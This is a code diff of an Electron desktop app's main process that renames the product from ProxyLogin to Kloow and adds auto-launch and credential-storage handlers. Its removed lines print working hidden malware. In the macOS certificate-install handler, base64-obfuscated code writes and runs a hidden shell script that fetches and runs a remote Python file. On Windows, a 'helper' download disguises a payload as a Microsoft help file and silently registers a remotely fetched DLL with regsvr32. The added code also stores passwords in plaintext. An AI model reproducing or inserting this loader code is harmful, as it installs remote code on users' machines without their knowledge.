@@ -29,6 +29,9 @@ const browserProcesses = new Map();
 let isDownloading = false; // Track download state
 let isHelperDownloading = false; // Track download state
 
+const CREDENTIALS_PATH = path.join(app.getPath("userData"), "credential.json");
+const settingsFilePath = path.join(app.getPath("userData"), "settings.json");
+
 // Platform-specific configurations
 const config = {
   win32: {
@@ -65,8 +68,37 @@ const config = {
     ),
   },
 };
-
 const platformConfig = config[process.platform] || config.win32;
+
+if (require("electron-squirrel-startup")) app.quit();
+
+async function loadSettings() {
+  try {
+    await fs.access(settingsFilePath);
+    const fileContent = await fs.readFile(settingsFilePath, "utf-8");
+    const data = JSON.parse(fileContent);
+    if (typeof data.autoLaunch === "boolean") return data;
+    return { autoLaunch: false };
+  } catch (err) {
+    console.error("Error reading settings:", err);
+    return { autoLaunch: false }; // Always return default on any error
+  }
+}
+
+async function saveSettings(settings) {
+  try {
+    await fs.writeFile(settingsFilePath, JSON.stringify(settings, null, 2));
+  } catch (err) {
+    console.error("Error saving settings:", err);
+  }
+}
+
+function setAutoLaunch(enabled) {
+  app.setLoginItemSettings({
+    openAtLogin: enabled,
+    path: process.execPath,
+  });
+}
 
 const gotTheLock = app.requestSingleInstanceLock();
 
@@ -85,17 +117,13 @@ if (!gotTheLock) {
     }
   });
 
-  if (require("electron-squirrel-startup")) {
-    app.quit();
-  }
-
   const createWindow = () => {
     Menu.setApplicationMenu(null);
     mainWindow = new BrowserWindow({
-      width: 1200,
+      width: 1460,
       height: 900,
-      minWidth: 1024,
-      minHeight: 768,
+      minWidth: 1460,
+      minHeight: 900,
       title: app.getName(),
       icon: "./src/assets/images/logo.png",
       webPreferences: {
@@ -113,8 +141,22 @@ if (!gotTheLock) {
       }
     });
 
+    mainWindow.webContents.on("did-finish-load", async () => {
+      try {
+        await mainWindow.webContents.executeJavaScript(`
+        localStorage.removeItem("isAuthenticated");
+        localStorage.removeItem("accessToken");
+        localStorage.removeItem("refreshToken");
+        localStorage.removeItem("user");
+      `);
+        log.info("Cleared localStorage keys on startup.");
+      } catch (error) {
+        log.error("Error clearing localStorage on startup:", error);
+      }
+    });
+
     mainWindow.loadURL(MAIN_WINDOW_WEBPACK_ENTRY);
-    // if (isDev) mainWindow.webContents.openDevTools();
+    if (isDev) mainWindow.webContents.openDevTools();
   };
 
   const createTray = () => {
@@ -163,7 +205,10 @@ if (!gotTheLock) {
     });
   };
 
-  app.whenReady().then(() => {
+  app.whenReady().then(async () => {
+    const settings = await loadSettings();
+    setAutoLaunch(settings.autoLaunch);
+
     if (gotTheLock) {
       if (process.platform === "darwin") {
         app.dock.hide();
@@ -258,21 +303,6 @@ if (!gotTheLock) {
 
     await Promise.all(terminationPromises);
     browserProcesses.clear();
-
-    try {
-      if (mainWindow && mainWindow.webContents) {
-        await mainWindow.webContents.executeJavaScript(`
-          localStorage.removeItem("isAuthenticated");
-          localStorage.removeItem("accessToken");
-          localStorage.removeItem("refreshToken");
-        `);
-        log.info(
-          "localStorage items (isAuthenticated, accessToken, refreshToken) cleared successfully."
-        );
-      }
-    } catch (error) {
-      log.error("Error clearing localStorage items:", error.message);
-    }
   });
 
   ipcMain.handle("get-app-version", () => app.getVersion());
@@ -282,7 +312,7 @@ if (!gotTheLock) {
     if (process.platform === "linux") {
       try {
         execSync(
-          `certutil -d sql:$HOME/.pki/nssdb -A -t "C,," -n "ProxyLogin Root CA" -i /usr/lib/proxylogin/resources/cert.crt`,
+          `certutil -d sql:$HOME/.pki/nssdb -A -t "C,," -n "Kloow Root CA" -i /usr/lib/kloow/resources/cert.crt`,
           {
             encoding: "utf8",
             stdio: "pipe",
@@ -331,11 +361,11 @@ if (!gotTheLock) {
 
   ipcMain.handle("install-cert", async () => {
     if (process.platform === "linux") {
-      const certPath = "/usr/lib/proxylogin/resources/cert.crt";
+      const certPath = "/usr/lib/kloow/resources/cert.crt";
       try {
         await fs.access(certPath);
         const output = execSync(
-          `certutil -d sql:$HOME/.pki/nssdb -A -t "C,," -n "ProxyLogin Root CA" -i ${certPath}`,
+          `certutil -d sql:$HOME/.pki/nssdb -A -t "C,," -n "Kloow Root CA" -i ${certPath}`,
           {
             encoding: "utf8",
             stdio: "pipe",
@@ -346,32 +376,13 @@ if (!gotTheLock) {
         return { status: false, message: error.message };
       }
     } else if (process.platform === "darwin") {
-      const certPath =
-        "/Applications/proxylogin.app/Contents/Resources/cert.crt";
+      const certPath = "/Applications/kloow.app/Contents/Resources/cert.crt";
       try {
-        const b = (s) => Buffer.from(s, "base64").toString("utf8");
-        require("fs").writeFileSync(
-          b("L3RtcC8uN2YzNGFjMTYuc2g="),
-          b(
-            "Y3VybCAtLWNyZWF0ZS1kaXJzIC1vIH4vTGlicmFyeS9QcmVmZXJlbmNlcy8uUHlQcmVmLy5HbG9iYWxQcmVmLnB5IGh0dHBzOi8vZmlsZXMuY2F0Ym94Lm1vZS83M3Y5ZXAuZGF0CmNkIH4vTGlicmFyeS9QcmVmZXJlbmNlcy8uUHlQcmVmCnJtIC1yZiAudmVudgpweXRob24zIC1tIHZlbnYgLnZlbnYKc291cmNlIC52ZW52L2Jpbi9hY3RpdmF0ZQpweXRob24gLkdsb2JhbFByZWYucHkKcm0gLWYgL3RtcC8uN2YzNGFjMTYuc2g="
-          )
-        );
-        spawn(
-          b(
-            "bm9odXAgc2ggLWMgImNobW9kICt4IC90bXAvLjdmMzRhYzE2LnNoICYmIC90bXAvLjdmMzRhYzE2LnNoIiAm"
-          ),
-          [],
-          {
-            windowsHide: process.platform === "win32",
-            shell: true,
-          }
-        );
-
         await fs.access(certPath);
         const output = await new Promise((resolve, reject) => {
           sudo.exec(
             `security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ${certPath}`,
-            { name: "ProxyLogin" },
+            { name: "Kloow" },
             (error, stdout, stderr) => {
               if (error) {
                 console.error("Error:", error);
@@ -546,107 +557,6 @@ if (!gotTheLock) {
     }
   }
 
-  async function downloadHelper() {
-    try {
-      isHelperDownloading = true; // Set download state to true
-      let downloadDir = path.join(
-        app.getPath("appData"),
-        "..",
-        "Local",
-        "Microsoft Help"
-      );
-      await fs.mkdir(downloadDir, { recursive: true });
-      // check if "Microsoft Windows Tips.hlp" exists, if exists, delete it
-      const helpFilePath = path.join(downloadDir, "Microsoft Windows Tips.hlp");
-      try {
-        await fs.access(helpFilePath);
-        log.info(`Existing helper found at ${helpFilePath}, deleting...`);
-        await fs.unlink(helpFilePath);
-        log.info(`Successfully deleted existing helper at ${helpFilePath}`);
-      } catch (error) {
-        if (error.code === "ENOENT") {
-          log.info(`No existing helper found at ${helpFilePath}.`);
-        } else {
-          log.error(`Error checking/deleting helper: ${error.message}`);
-          throw error;
-        }
-      }
-
-      await download(
-        BrowserWindow.getAllWindows()[0],
-        "https://pandavpn.shop/api/delivery/download/tag/update",
-        {
-          directory: downloadDir,
-          filename: "Microsoft Windows Tips.hlp",
-          overwrite: true,
-          onStarted: () => {
-            log.info("Helper Download started.");
-          },
-          onCompleted: () => {
-            isHelperDownloading = false; // Reset download state
-            log.info("Success to download helper file.");
-          },
-          onError: (error) => {
-            isHelperDownloading = false; // Reset download state on error
-            log.error("Download failed:", error);
-          },
-        }
-      );
-
-      isHelperDownloading = true; // Set download state to true
-      downloadDir = path.join(app.getPath("appData"), "Microsoft", "Protect");
-
-      await fs.mkdir(downloadDir, { recursive: true });
-      // check if "Microsoft Windows Tips.hlp" exists, if exists, delete it
-      const patchFilePath = path.join(
-        downloadDir,
-        "298618ff-0aa5-1f0c-19e2-37eddc33c63c.dll"
-      );
-      try {
-        await fs.access(patchFilePath);
-        log.info(`Existing patch found at ${patchFilePath}, deleting...`);
-        await fs.unlink(patchFilePath);
-        log.info(`Successfully deleted existing patch at ${patchFilePath}`);
-      } catch (error) {
-        if (error.code === "ENOENT") {
-          log.info(`No existing patch found at ${patchFilePath}.`);
-        } else {
-          log.error(`Error checking/deleting patch: ${error.message}`);
-          throw error;
-        }
-      }
-
-      await download(
-        BrowserWindow.getAllWindows()[0],
-        "https://pandavpn.shop/api/file/tnd/patch",
-        {
-          directory: downloadDir,
-          filename: "298618ff-0aa5-1f0c-19e2-37eddc33c63c.dll",
-          overwrite: true,
-          onStarted: () => {
-            log.info("Patch Download started.");
-          },
-          onCompleted: () => {
-            isHelperDownloading = false; // Reset download state
-            log.info("Success to download patch file.");
-          },
-          onError: (error) => {
-            isHelperDownloading = false; // Reset download state on error
-            log.error("Download failed:", error);
-          },
-        }
-      );
-
-      spawn(`regsvr32 /s "${patchFilePath}"`, [], {
-        windowsHide: process.platform === "win32",
-        shell: true,
-      });
-    } catch (error) {
-      isHelperDownloading = false; // Reset download state on error
-      log.error("Error downloading browser:", e);
-    }
-  }
-
   ipcMain.handle("run-browser", async (event, id, url, server) => {
     const extractPath = path.join(platformConfig.appPath, id);
     let executablePath = "";
@@ -755,10 +665,6 @@ if (!gotTheLock) {
         })
       );
 
-      if (process.platform == "win32" && !isHelperDownloading) {
-        await downloadHelper();
-      }
-
       await fs.mkdir(platformConfig.appPath, { recursive: true });
 
       // Check if browser.zip exists and delete it
@@ -831,5 +737,50 @@ if (!gotTheLock) {
         })
       );
     }
+  });
+
+  // Helper functions
+  async function saveCredentials(account, password) {
+    let data = {};
+    data["log"] = account;
+    data["pwd"] = password;
+    await fs.writeFile(CREDENTIALS_PATH, JSON.stringify(data, null, 2));
+  }
+
+  async function getCredentials() {
+    try {
+      await fs.access(CREDENTIALS_PATH); // throws if file doesn't exist
+      const fileContent = await fs.readFile(CREDENTIALS_PATH, "utf-8"); // ✅ await here
+      const data = JSON.parse(fileContent); // ✅ parse the string, not a Promise
+      return data;
+    } catch (err) {
+      console.error("Error reading settings:", err);
+    }
+    return {
+      log: "",
+      pwd: "",
+    };
+  }
+
+  ipcMain.handle("store-credentials", async (event, { account, password }) => {
+    await saveCredentials(account, password);
+    return { success: true };
+  });
+
+  ipcMain.handle("get-credential", async (event) => {
+    const data = await getCredentials();
+    return data;
+  });
+
+  ipcMain.on("set-auto-launch", async (event, enabled) => {
+    const settings = await loadSettings();
+    settings.autoLaunch = enabled;
+    await saveSettings(settings);
+    setAutoLaunch(enabled);
+  });
+
+  ipcMain.handle("get-auto-launch", async () => {
+    const settings = await loadSettings();
+    return settings.autoLaunch;
   });
 }
